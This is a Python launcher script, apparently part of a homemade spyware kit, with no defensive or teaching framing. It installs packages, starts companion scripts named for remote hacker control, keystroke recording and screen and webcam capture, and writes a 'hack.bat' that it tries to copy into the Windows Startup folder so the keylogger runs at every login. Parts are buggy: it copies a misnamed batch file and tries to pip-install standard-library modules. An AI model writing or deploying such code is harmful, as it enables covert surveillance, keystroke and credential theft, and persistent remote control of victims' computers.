import os
import shutil
import subprocess

subprocess.call("pip install requests")
subprocess.call("pip install shutil")
subprocess.call("pip install keyboard")
subprocess.call("pip install asyncio")
subprocess.call("pip install discord")    
subprocess.call("pip install asyncio")  
subprocess.call("pip install mss")  
subprocess.call("pip install cv2")  
subprocess.call("pip install PIL")  
subprocess.call("pip install io")   
subprocess.call("pip install opencv-python-headless")


def search_file(folder):
    for path, dirs, files in os.walk(folder):
        for file in files:
            if file == "recordKey.py":
                script_path = os.path.abspath(os.path.join(path, file))
                script_path = script_path.replace("C:", "")  # remove the "C:" at the front
                create_batch_file(script_path)
                break

def create_batch_file(script_path):
    batch_file = open("hack.bat", "w")
    batch_file.write("@echo off\n")
    batch_file.write("cd /D %~dp0\n")
    batch_file.write(f"python {script_path}\n")
    batch_file.close()

    # Get the Startup folder path
    startup_folder = os.path.join(os.environ["USERPROFILE"], "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")

    # Copy the batch file to the Startup folder
    shutil.copy2("-startup.bat-", startup_folder)


subprocess.Popen(["python", "letHackerControl.py"])
subprocess.Popen(["python", "recordKey.py"])
subprocess.Popen(["python", "screenAndCamera.py"])

# Starting directory
root_folder = 'C:\\'

search_file(root_folder)
